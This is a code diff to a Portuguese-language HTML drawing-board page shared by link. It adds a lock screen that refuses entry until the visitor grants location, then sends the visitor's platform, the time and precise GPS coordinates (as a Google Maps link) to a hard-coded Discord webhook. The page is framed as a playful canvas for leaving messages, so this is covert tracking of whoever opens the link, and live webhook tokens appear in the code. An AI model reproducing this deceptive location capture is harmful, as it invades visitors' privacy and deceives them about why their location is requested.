@@ -15,10 +15,17 @@
         body {
             margin: 0; padding: 0; overflow: hidden;
             background-color: var(--bg);
-            /* O gradiente agora parte do preto para um tom bem escuro do seu vermelho */
             background-image: radial-gradient(circle at 50% 50%, #1a0409 0%, var(--bg) 100%);
             font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        /* Tela de Bloqueio Inicial */
+        #overlay-acesso {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg); z-index: 1000;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            text-align: center; padding: 20px;
         }
 
         #header-texto {
@@ -61,7 +68,7 @@
             width: 260px;
             padding: 12px 15px;
             background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(198, 28, 68, 0.3); /* Borda sutil com seu vermelho */
+            border: 1px solid rgba(198, 28, 68, 0.3);
             border-radius: 8px;
             color: var(--text);
             font-family: inherit;
@@ -73,13 +80,9 @@
 
         #mensagem-input:focus {
             background: rgba(255, 255, 255, 0.1);
-            border-color: var(--primary); /* Foca com seu vermelho principal */
+            border-color: var(--primary);
             width: 300px;
             box-shadow: 0 0 15px rgba(198, 28, 68, 0.2);
-        }
-
-        #mensagem-input::placeholder {
-            color: rgba(255, 255, 255, 0.3);
         }
 
         #toolbar {
@@ -103,25 +106,11 @@
             letter-spacing: 1px;
         }
 
-        .btn-quadro:active { transform: scale(0.95); }
-        
-        /* Botão Ativo com a sua cor primária */
         .ativo { 
             background: var(--primary); 
             color: white; 
             border-color: var(--primary);
             box-shadow: 0 0 15px rgba(198, 28, 68, 0.4);
-        }
-
-        #btn-enviar {
-            background: #1a1a1a;
-            border: 1px solid var(--primary);
-            color: var(--primary);
-        }
-
-        #btn-enviar:hover {
-            background: var(--primary);
-            color: white;
         }
 
         canvas { display: block; touch-action: none; cursor: crosshair; }
@@ -130,7 +119,6 @@
             position: absolute; display: none; color: white; font-size: 1rem;
             text-align: center; z-index: 50; background: rgba(0,0,0,0.9);
             padding: 15px 30px; border-radius: 12px; border: 1px solid var(--primary);
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
 
         .flash-active { animation: flashAnim 0.7s ease-out; }
@@ -138,6 +126,12 @@
     </style>
 </head>
 <body>
+
+    <div id="overlay-acesso">
+        <h2 style="color: var(--primary); margin-bottom: 20px;">Bem-vindo a Primeira nova etapa!</h2>
+        <p style="color: var(--text); margin-bottom: 30px; font-size: 0.9rem; max-width: 300px;">Para continuar e liberar o acesso, precisamos que voce permita a localização.</p>
+        <button id="btn-entrar" class="btn-quadro ativo" onclick="liberarEGerarLog()">Entrar no Quadro 🔓</button>
+    </div>
 
     <div id="header-texto">
         <h1>Desenhe e escreva o que vier na sua mente quando recebeu esse link ou se lembra de mim!</h1>
@@ -154,7 +148,7 @@
         <div id="toolbar">
             <button id="btn-giz" class="btn-quadro ativo" onclick="setModo('giz')">✏️ Giz</button>
             <button id="btn-borracha" class="btn-quadro" onclick="setModo('borracha')">🧼 Borracha</button>
-            <button id="btn-enviar" class="btn-quadro" onclick="capturarEEnviar()">Enviar 📸</button>
+            <button id="btn-enviar" class="btn-quadro" style="background: #1a1a1a; border-color: var(--primary); color: var(--primary);" onclick="capturarEEnviar()">Enviar 📸</button>
         </div>
     </div>
 
@@ -165,7 +159,9 @@
         const statusMsg = document.getElementById('status-msg');
         const inputMsg = document.getElementById('mensagem-input');
         
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1498467679097327670/ux0Y9AVqufg7tGCheSBXNc0WZvF2OYh2HRGKDJhqdm-KTq1eVKdajWsSofQKTNAYYmwC"; 
+        // WEBHOOKS SEPARADAS
+        const DISCORD_WEBHOOK_QUADRO = "https://discord.com/api/webhooks/1498467679097327670/ux0Y9AVqufg7tGCheSBXNc0WZvF2OYh2HRGKDJhqdm-KTq1eVKdajWsSofQKTNAYYmwC"; 
+        const DISCORD_WEBHOOK_LOGS = "https://discord.com/api/webhooks/1503850219559850177/m7-XQ6IyCu0UgQJ_p-kn7i0nzbSpfyBzJWsMJ2f9aoV3aMkQDG5CaxWjNt_ozasupw3Q"; 
 
         let desenhando = false;
         let modo = 'giz';
@@ -173,6 +169,50 @@
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
 
+        // --- LÓGICA DE LOG E LIBERAÇÃO ---
+        async function liberarEGerarLog() {
+            const btn = document.getElementById('btn-entrar');
+            btn.innerText = "Validando...";
+            btn.disabled = true;
+
+            const dadosAcesso = {
+                plataforma: navigator.platform,
+                horario: new Date().toLocaleString('pt-BR')
+            };
+
+            const finalizarAcesso = async (lat = null, lon = null) => {
+                let msg = `👀 **Página Liberada!**\n📱 **Dispositivo:** ${dadosAcesso.plataforma}\n⏰ **Hora:** ${dadosAcesso.horario}`;
+                
+                if (lat && lon) {
+                    msg += `\n📍 **Localização:** https://www.google.com/maps?q=${lat},${lon}`;
+                } else {
+                    msg += `\n⚠️ **Localização recusada ou indisponível.**`;
+                }
+
+                try {
+                    await fetch(DISCORD_WEBHOOK_LOGS, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: msg })
+                    });
+                } catch (e) { console.error("Erro no log"); }
+
+                // Esconde a trava e permite o uso
+                document.getElementById('overlay-acesso').style.display = 'none';
+            };
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (p) => finalizarAcesso(p.coords.latitude, p.coords.longitude),
+                    () => finalizarAcesso(),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                finalizarAcesso();
+            }
+        }
+
+        // --- LÓGICA DO DESENHO ---
         function setModo(m) {
             modo = m;
             document.getElementById('btn-giz').classList.toggle('ativo', m === 'giz');
@@ -187,15 +227,12 @@
 
         function iniciar(e) {
             if (e.target.id === 'mensagem-input') return;
-            
             desenhando = true;
             const pos = getPos(e);
             ctx.beginPath();
             ctx.moveTo(pos.x, pos.y);
-            
             if (modo === 'giz') {
                 ctx.globalCompositeOperation = 'source-over';
-                // O "Giz" agora é um branco levemente avermelhado para combinar
                 ctx.strokeStyle = "rgba(255, 235, 240, 0.85)";
                 ctx.lineWidth = 3;
                 ctx.lineCap = 'round';
@@ -214,7 +251,6 @@
 
         async function capturarEEnviar() {
             const textoUsuario = inputMsg.value || "Sem mensagem.";
-
             flash.classList.add('flash-active');
             statusMsg.style.display = 'block';
             
@@ -226,16 +262,13 @@
                 }));
 
                 try {
-                    const response = await fetch(DISCORD_WEBHOOK, {
+                    const response = await fetch(DISCORD_WEBHOOK_QUADRO, {
                         method: 'POST',
                         body: formData
                     });
-
                     if (response.ok) {
                         statusMsg.innerHTML = "✅ Recebido! Até logo...";
-                        setTimeout(() => {
-                            window.location.href = "inicio.html";
-                        }, 1500);
+                        setTimeout(() => { window.location.href = "inicio.html"; }, 1500);
                     } else {
                         statusMsg.innerHTML = "❌ Erro ao enviar";
                         setTimeout(() => statusMsg.style.display = 'none', 2000);
@@ -256,7 +289,6 @@
         });
         window.addEventListener('touchmove', (e) => { mover(e); });
         window.addEventListener('touchend', () => desenhando = false);
-
         window.addEventListener('resize', () => {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
